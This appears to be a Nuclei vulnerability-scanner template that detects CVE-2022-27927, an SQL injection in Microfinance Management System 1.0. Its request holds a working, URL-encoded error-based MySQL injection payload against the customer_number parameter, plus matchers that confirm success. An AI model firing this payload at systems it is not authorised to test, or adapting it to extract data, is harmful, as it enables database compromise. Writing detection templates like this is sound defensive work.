id: microfinance-management-system-sqli

info:
  name: Microfinance Management System 1.0 - 'customer_number' SQLi
  author: eren-gozaydin
  severity: high
  description: Microfinance Management System allows SQL Injection via parameter 'customer_number' in /mims/updatecustomer.php. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
  reference:
    - https://www.sourcecodester.com/php/14822/microfinance-management-system.html
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27927
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-27927
  metadata:
    version: 1
    tested-on: Windows 10 Pro + PHP 8.0.11, Apache 2.4.51
  tags: cve,cve2022,sqli,microfinance

requests:
  - method: GET
    path:
      - "{{BaseURL}}/mims/updatecustomer.php?customer_number=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SQL syntax"
          - "MySQL"
        condition: or
      - type: word
        words:
          - "!@4dilemma"
        part: body

    extractors:
      - type: regex
        part: body
        regex:
          - "!@4dilemma:[0-1]"

    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "en-us,en;q=0.5"
      Cache-Control: "no-cache"
      Cookie: "PHPSESSID=rf50l831r3vn4ho0g6aef189bt"
      Referer: "http://localhost/mims/managecustomer.php"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36"
